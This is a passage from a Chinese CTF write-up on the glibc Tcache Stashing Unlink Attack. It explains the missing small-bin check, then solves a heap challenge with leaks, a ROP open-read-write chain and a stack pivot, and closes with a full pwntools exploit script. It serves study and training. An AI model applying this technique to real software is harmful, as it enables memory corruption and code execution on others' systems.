class="type">void</span> *p = chunk2mem (victim);  </span><br><span class="line">          alloc_perturb (p, bytes);  </span><br><span class="line">          <span class="keyword">return</span> p;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br></pre></td></tr></table></figure>

<p>我们发现House Of Lore中要绕过的检查，这里同样要绕过。<code>__glibc_unlikely(bck-&gt;fd != victim)</code></p>
<p>对于这个检查的问题海爷是这么说的：从small bin中取出最后一个chunk的时候，对双向链表做了完整性的检查，然而，后面将剩余chunk放入tcache bin的时候，却没有这个检查。然后，bck-&gt;fd &#x3D; bin;这句代码，可以将bck-&gt;fd处写一个main_arena地址。如果我们可以控制bck，那么就能实现任意地址处写一个main_arena的地址。同理，如果我们能够控制small bin的bck，并且保证vuln_addr-&gt;fd &#x3D; bck，那么就能分配到vuln_addr处。<br /></p>
<p>按照我的理解来说就是，在存在一条tcache bin（未满）和两个相同大小的smallbin存在的时候，通过calloc函数申请此大小的堆块触发将后一个smallbin中的堆块插入tcachebin链中。在获取到一个smallbin中的一个chunk后，如果tcache任由足够空闲位置，会将剩余的smallbin挂进tcache中，在这个过程中只对第一个bin进行了完整性检查，后面的堆块的检查缺失。当攻击者可以修改一个small bin的bk时，就可以实现在任意地址上写一个libc地址。构造得当的情况下也可以分配fake_chunk到任意地址。</p>
<p>在glibc中有这样的关键代码：</p>
<p>可见在tcache_put函数中并没有做任何的安全检查所以当Tcachebin这种由两个及以上的空位程序就会将smallbin中bk上的fake chunk链入tcachebin中。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> <span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>篇幅问题具体调试过程已经在网上被人写烂了，我就大概写一下过程：</p>
<p>先是创建了一个数组stack_var[0x10]，还有一个指针数组chunk_list[0x10]，还有一个指针target。然后打印了数组，指针数组，指针的地址。然后再stack_var[3]的地方放入stack_var[2]的地址。之后创建8个0xa0大小的chunk，并且将他们的指针放入chunk_list[]中，然后释放掉6个chunk到tcachebin中。接下来依序释放chunk_lis[1]、chunk_lis[0]、chunk_lis[2]中malloc指针指向的chunk。然后连续创建三个chunk，大小分别为0xb0、0xa0、0xa0。然后将chunk_lis[2][1]位置中的内容修改成stack_var的起始地址，接着调用calloc()函数申请一个size为0xa0大小的chunk。最后申请一个size为0xa0大小的chunk，并将其malloc指针赋给target变量，并打印target。<br /></p>
<h3 id="题目实践"><a href="#题目实践" class="headerlink" title="题目实践"></a>题目实践</h3><p>仍然是找到网上最经典的题目：[BUUOJ-2020 新春红包题-3]</p>
<h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><p>我们的重点是看Tcache Stashing Unlink Attack的利用方式，那么我们就用几句简单的话来描述这个程序的漏洞：</p>
<pre><code>保护出了canary之外全部开启，有增查删改，在free中没有将指针置零说明存在Use After Free漏洞，所以这个uaf非常容易利用。在add功能的时候分配堆块的时候是calloc()函数，在其申请的过程中会将chunk内的内容清空，还有我们之前说过的不会从tcache bin中取出这样的话只要是把Tcache bin中填满就可以正常利用了。开启了沙箱。
</code></pre>
<p>然后程序还留了后门，只要满足条件就可以。</p>
<h4 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h4><h5 id="获得unsorted-bin"><a href="#获得unsorted-bin" class="headerlink" title="获得unsorted bin"></a>获得unsorted bin</h5><p>首先我们先填满0x100的tcache bin的堆块链表，然后获得0x410的unsorted bin chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">	add(i,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">14</span>):</span><br><span class="line">	add(i,<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">	delete(i)</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220401204947-h36u7xn.png" alt="image.png"></p>
<h5 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak_heap"></a>leak_heap</h5><p>因为我们得到了tcache bin链，这就很好也可以泄露出heap地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_addr = uu64(ru(<span class="string">&#x27;\x0a&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_addr=&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220401210302-8ymurax.png" alt="image.png"></p>
<h5 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak_libc"></a>leak_libc</h5><p>也有unsorted bin，那么也可以同理泄露出libc</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc = uu64(ru(<span class="string">&#x27;\x0a&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">0x7fd1a23ddca0</span> + <span class="number">0x7fd1a1ff2000</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc))</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220401211603-hw5le0e.png" alt="image.png"></p>
<h5 id="构造orw链"><a href="#构造orw链" class="headerlink" title="构造orw链"></a>构造orw链</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000026542</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000026f9e</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x000000000012bda6</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x0000000000058373</span></span><br><span class="line">opens = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">puts = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">open_addr = libc_base + opens</span><br><span class="line">read_addr = libc_base + read</span><br><span class="line">puts_addr = libc_base + puts</span><br><span class="line">orw_addr = heap_addr + <span class="number">0x1F80</span></span><br><span class="line">flag_addr = orw_addr + <span class="number">0x78</span></span><br><span class="line">orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_addr)</span><br><span class="line">orw += p64(pop_rdi) + p64(flag_addr) + p64(puts_addr)</span><br><span class="line">orw += <span class="string">&#x27;/password.txt\x00&#x27;</span></span><br></pre></td></tr></table></figure>

<h5 id="重要的unlink"><a href="#重要的unlink" class="headerlink" title="重要的unlink"></a>重要的unlink</h5><p>从0x410的unsorted bin里切割一个0x310的空间，剩下的0x100的unsorted bin</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220401213023-f8p4e52.png" alt="image.png"></p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220401213118-ub8wd3f.png" alt="image.png"></p>
<p>malloc一大的堆，使得unsorted bin里的0x100的chunk放入small bin</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>,<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>可以看到堆块进入了smallbin</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220401213527-fjfnup5.png" alt="image.png"></p>
<p>挡住top chunk，不能小于0x100，不然会从得到的small bin里取</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">1</span>,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>我们使用同样的方法，来得到第二个0x100的unsorted bin</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>现在small bin中有了两个堆块</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220401214116-pvi4yqp.png" alt="image.png"></p>
<p>利用uaf修改第一个small bin的bk指针指向我们想要控制的地方</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x300</span></span><br><span class="line">pl += p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)<span class="comment">#保持好small bin的chunk头</span></span><br><span class="line">pl += p64(heap_addr + <span class="number">0x1F70</span>)<span class="comment">#fd保持链子的完整</span></span><br><span class="line">pl += p64(heap_addr - <span class="number">0x1010</span> + <span class="number">0x800</span> - <span class="number">0x10</span>)<span class="comment">#我们要控制的地方</span></span><br><span class="line">edit(<span class="number">0</span>,pl)</span><br></pre></td></tr></table></figure>

<p>成功控制</p>
<p><img src="https://assets.b3logfile.com/siyuan/1637149294294/assets/image-20220401214904-wch70uw.png" alt="image.png"></p>
<p>所以说我们现在就可以申请到目标位置了，这就是Tcache Stashing Unlink Attack</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">2</span>,<span class="number">0xF0</span>,orw)</span><br></pre></td></tr></table></figure>

<p>然后我们就是栈迁移到这里执行orw</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x300</span></span><br><span class="line">pl += p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)</span><br><span class="line">pl += p64(heap_addr + <span class="number">0x1F70</span>)</span><br><span class="line">pl += p64(heap_addr - <span class="number">0x1010</span> + <span class="number">0x800</span> - <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>,pl)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0xF0</span>,orw)</span><br><span class="line">sla(<span class="string">&#x27;Your input:&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span></span><br><span class="line">pl += p64(orw_addr - <span class="number">0x8</span>)</span><br><span class="line">pl += p64(leave_ret)</span><br><span class="line">sla(pl)</span><br></pre></td></tr></table></figure>

<p>这大概就是Tcache Stashing Unlink Attack的利用过程</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;1&quot;</span></span><br><span class="line">libcelf = <span class="string">&quot;libc-2.29.so&quot;</span></span><br><span class="line">ip = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="string">&quot;&quot;</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">arm = <span class="number">0</span></span><br><span class="line">core = <span class="number">64</span></span><br><span class="line"></span><br><span class="line">og = [<span class="number">0x4342</span>,<span class="number">0x3342</span>]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(local==<span class="number">1</span>):</span><br><span class="line">	<span class="keyword">if</span>(arm==<span class="number">1</span>):</span><br><span class="line">		<span class="keyword">if</span>(core==<span class="number">64</span>):</span><br><span class="line">			p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1212&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>,binary])</span><br><span class="line">		<span class="keyword">if</span>(core==<span class="number">32</span>):</span><br><span class="line">			p = process([<span class="string">&quot;qemu-aarch64&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1212&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>, binary])</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = remote(ip,port)</span><br><span class="line"></span><br><span class="line">elf = ELF(binary)</span><br><span class="line">libc = ELF(libcelf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">cho</span>):</span><br><span class="line">	sla(<span class="string">&#x27;Your input: &#x27;</span>,cho)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">	choice(<span class="number">1</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Please input the red packet idx: &#x27;</span>,idx)</span><br><span class="line">	sla(<span class="string">&#x27;How much do you want?(1.0x10 2.0xf0 3.0x300 4.0x400): &#x27;</span>,size)</span><br><span class="line">	sla(<span class="string">&#x27;Please input content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">	choice(<span class="number">2</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Please input the red packet idx: &#x27;</span>,idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">	choice(<span class="number">4</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Please input the red packet idx: &#x27;</span>,idx)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">	choice(<span class="number">3</span>)</span><br><span class="line">	sla(<span class="string">&#x27;Please input the red packet idx: &#x27;</span>,idx)</span><br><span class="line">	sla(<span class="string">&#x27;Please input content: &#x27;</span>,content) </span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">		add(i,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>,<span class="number">14</span>):</span><br><span class="line">		add(i,<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>):</span><br><span class="line">		delete(i)</span><br><span class="line">	show(<span class="number">1</span>)</span><br><span class="line">	heap_addr = uu64(ru(<span class="string">&#x27;\x0a&#x27;</span>))</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;heap_addr=&#x27;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">	show(<span class="number">7</span>)</span><br><span class="line">	libc_base = uu64(ru(<span class="string">&#x27;\x0a&#x27;</span>)[-<span class="number">6</span>:]) - <span class="number">0x7fd1a23ddca0</span> + <span class="number">0x7fd1a1ff2000</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">	pop_rdi = libc_base + <span class="number">0x0000000000026542</span></span><br><span class="line">	pop_rsi = libc_base + <span class="number">0x0000000000026f9e</span></span><br><span class="line">	pop_rdx = libc_base + <span class="number">0x000000000012bda6</span></span><br><span class="line">	leave_ret = libc_base + <span class="number">0x0000000000058373</span></span><br><span class="line">	opens = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">	read = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">	puts = libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">	open_addr = libc_base + opens</span><br><span class="line">	read_addr = libc_base + read</span><br><span class="line">	puts_addr = libc_base + puts</span><br><span class="line">	orw_addr = heap_addr + <span class="number">0x1F80</span></span><br><span class="line">	flag_addr = orw_addr + <span class="number">0x78</span></span><br><span class="line">	orw = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(open_addr)</span><br><span class="line">	orw += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_addr)</span><br><span class="line">	orw += p64(pop_rdi) + p64(flag_addr) + p64(puts_addr)</span><br><span class="line">	orw += <span class="string">&#x27;./flag\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">	add(<span class="number">0</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	add(<span class="number">0</span>,<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">4</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	delete(<span class="number">0</span>)</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">	add(<span class="number">1</span>,<span class="number">4</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x300</span></span><br><span class="line">	pl += p64(<span class="number">0</span>) + p64(<span class="number">0x101</span>)</span><br><span class="line">	pl += p64(heap_addr + <span class="number">0x1F70</span>)</span><br><span class="line">	pl += p64(heap_addr - <span class="number">0x1010</span> + <span class="number">0x800</span> - <span class="number">0x10</span>)</span><br><span class="line">	edit(<span class="number">0</span>,pl)</span><br><span class="line">	add(<span class="number">2</span>,<span class="number">0xF0</span>,orw)</span><br><span class="line">	sla(<span class="string">&#x27;Your input:&#x27;</span>,<span class="string">&#x27;666&#x27;</span>)</span><br><span class="line">	pl = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x80</span></span><br><span class="line">	pl += p64(orw_addr - <span class="number">0x8</span>)</span><br><span class="line">	pl += p64(leave_ret)</span><br><span class="line">	sla(pl)</span><br><span class="line">	<span class="comment">#gdb.attach(p)</span></span><br><span class="line">	itr()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">i = 0</span></span><br><span class="line"><span class="string">while 1:</span></span><br><span class="line"><span class="string">	i += 1</span></span><br><span class="line"><span class="string">	log.warn(str(i))</span></span><br><span class="line"><span class="string">	try:  </span></span><br><span class="line"><span class="string">		pwn()</span></span><br><span class="line"><span class="string">	except Exception:</span></span><br><span class="line"><span class="string">		p.close()</span></span><br><span class="line"><span class="string">		if(local == 1):</span></span><br><span class="line"><span class="string">			p = process(binary)</span></span><br><span class="line"><span class="string">		else:</span></span><br><span class="line"><span class="string">			p = remote(ip,port)</span></span><br><span class="line"><span class="string">		continue</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	pwn()</span><br></pre></td></tr></table></figure>

<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>有了高版本unlink的利用方法。以后做题也有个思路。</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/198173">Tcache Stashing Unlink Attack利用思路 - 安全客，安全资讯平台 (anquanke.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/105870247">(9条消息) Tcache Stashing Unlink Attack_ha1vk的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/113604261">(9条消息) 好好说话之Tcache Attack（3）：tcache stashing unlink attack_hollk的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Echoion/article/details/120499769">(9条消息) House_of_Lore学习_Echo1l的博客-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiziyunqi/article/details/81349657">(9条消息) house of lore学习_西子云齐的博客-CSDN博客</a></p>
</div>
</article>

  </main>
  <aside>
    <p>This is an `aside`, a useful place to put information of any kind: metadata about the site author (with or without pictures), brief information about the purposes of the site, a static collection of external links or anything else.</p>
<p>For some Classless themes pictures and data about the author may suit better in the `cover` and `description` site attributes (see `config.toml`), but most of the times that kind of information will fit here better.</p>

  </aside>
  <footer role="contentinfo">
    <p>A default site footer. If you don't know what to place here maybe you should just write your name plus the current year?</p>
<p>If you want to have a sitemap, a contact form or other complex stuff, most Classless themes will also handle it nicely. Or you can take a look at the <code>aside.html</code> partial.</p>

  </footer>
</body>
